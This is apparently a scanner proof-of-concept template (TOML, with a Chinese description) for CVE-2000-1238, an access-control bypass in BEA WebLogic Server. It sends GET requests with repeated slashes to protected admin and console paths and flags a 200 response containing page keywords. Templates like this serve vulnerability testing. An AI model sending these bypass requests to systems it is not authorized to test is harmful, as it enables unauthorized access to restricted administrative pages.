[info]
author = "AVE"
description = "通过向 WebLogic 受限 JSP/Servlet 页面 URL 中插入多个连续正斜杠（如 //admin/secret.jsp），验证是否存在访问控制绕过漏洞。若返回 200 且包含页面内容，则说明存在漏洞。"
id = "POC-AVE-2000-1165"
name = "BEA WebLogic Server 访问控制绕过漏洞 PoC"
severity = "high"
tags = [
    "cve-2000-1238",
    "weblogic",
    "access-control-bypass",
]
vuln_id = [
    "CVE-2000-1238",
    "AVE-2000-1165",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}//protected/admin.jsp"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<html",
    "<HTML",
    "Welcome",
    "Admin",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}///console/"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<html",
    "<HTML",
    "WebLogic",
    "Console",
]
